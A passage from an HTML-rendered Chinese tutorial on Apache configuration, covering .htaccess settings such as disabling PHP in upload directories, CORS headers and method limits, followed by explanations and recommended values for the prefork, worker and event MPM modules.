<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_value</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> post_max_size</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10M</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_value</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> max_execution_time</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 30</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_value</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> memory_limit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 128M</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 禁用PHP执行（上传目录）======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在上传目录中禁用PHP</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.php$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 或使用</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">php_flag</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> engine</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">AddType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> .php .php3 .phtml</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 性能优化 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用KeepAlive</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Connection keep-alive</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ETags</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">FileETag</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> unset</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ETag</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== CORS配置 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Access-Control-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Allow</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Origin &quot;*&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Access-Control-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Allow</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Methods &quot;GET, POST, OPTIONS&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Access-Control-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Allow</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Headers &quot;Content-Type&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ====== 限制HTTP方法 ======</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GET POST HEAD</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<hr/>
<h3 id="7-mpm配置文件详解">7. MPM配置文件详解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-mpm配置文件详解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>多处理模块（Multi-Processing Module）控制Apache如何处理并发请求。</p>
<h5 id="71-mpm_preforkconf---预派生模式">7.1 mpm_prefork.conf - 预派生模式<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#71-mpm_preforkconf---预派生模式" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<p><strong>特点：</strong> 多进程，每个进程单线程，兼容性最好但资源占用较大。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_prefork_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启动时创建的子进程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             5</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最小空闲子进程数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 如果空闲进程少于此值，会创建新进程</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          5</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大空闲子进程数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 如果空闲进程超过此值，会终止多余进程</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          10</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 同时处理的最大请求数（即最大子进程数）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程处理的最大请求数后重启</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 0表示永不重启（推荐设置为非0值防止内存泄漏）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 服务器负载的绝对最大值</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ServerLimit            256</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>计算公式：</strong></p>
<ul>
<li>内存需求 ≈ MaxRequestWorkers × 每个进程内存使用量</li>
<li>示例：如果每个Apache进程使用20MB内存
<ul>
<li>MaxRequestWorkers = 150</li>
<li>总内存需求 ≈ 150 × 20MB = 3GB</li>
</ul>
</li>
</ul>
<p><strong>推荐配置（不同场景）：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 小型服务器（1-2GB RAM）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             2</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MinSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          2</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   3000</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 中型服务器（4-8GB RAM）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MinSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          5</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          10</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 大型服务器（16GB+ RAM）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             10</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MinSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          10</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxSpareServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          20</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        400</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span></code></pre></figure>
<h5 id="72-mpm_workerconf---工作者模式">7.2 mpm_worker.conf - 工作者模式<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#72-mpm_workerconf---工作者模式" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<p><strong>特点：</strong> 多进程多线程，性能好，资源占用适中。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_worker_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启动时创建的子进程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最小空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          75</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程的线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大并发连接数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # MaxRequestWorkers = ServerLimit × ThreadsPerChild</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程处理的最大请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   0</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大子进程数限制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ServerLimit            16</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程的最大线程数限制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ThreadLimit            64</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>计算示例：</strong></p>
<pre><code>如果 ThreadsPerChild = 25，ServerLimit = 16
则 MaxRequestWorkers 最大可以设置为：16 × 25 = 400
</code></pre>
<p><strong>推荐配置：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 中型服务器（4-8GB RAM）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             3</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          75</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 高流量服务器（16GB+ RAM）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             4</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        400</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ServerLimit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">              16</span></span></code></pre></figure>
<h5 id="73-mpm_eventconf---事件模式推荐">7.3 mpm_event.conf - 事件模式（推荐）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#73-mpm_eventconf---事件模式推荐" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<p><strong>特点：</strong> 类似worker但处理Keep-Alive更高效，推荐用于高性能场景。</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_event_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启动时创建的子进程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最小空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大空闲线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          75</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程的线程数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          25</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大并发连接数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        150</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程处理的最大请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   0</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 每个子进程的最大线程数限制</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadLimit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">              64</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 最大子进程数限制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ServerLimit            16</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 异步请求处理线程数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # AsyncRequestWorkerFactor 2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>Event MPM专用参数：</strong></p>
<ul>
<li><code>AsyncRequestWorkerFactor</code> - 异步连接处理因子
<ul>
<li>最大并发连接数 = MaxRequestWorkers × AsyncRequestWorkerFactor</li>
<li>默认值为2，适用于Keep-Alive连接多的场景</li>
</ul>
</li>
</ul>
<p><strong>高性能配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm_event_module</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    StartServers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">             3</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MinSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxSpareThreads</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          150</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">          50</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ThreadLimit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">              64</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxRequestWorkers</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        400</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    MaxConnectionsPerChild</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">   10000</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerLimit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">              16</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    AsyncRequestWorkerFactor </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>切换MPM模块：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看当前MPM</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -V</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mpm</span></span>
<span data-line> </span>
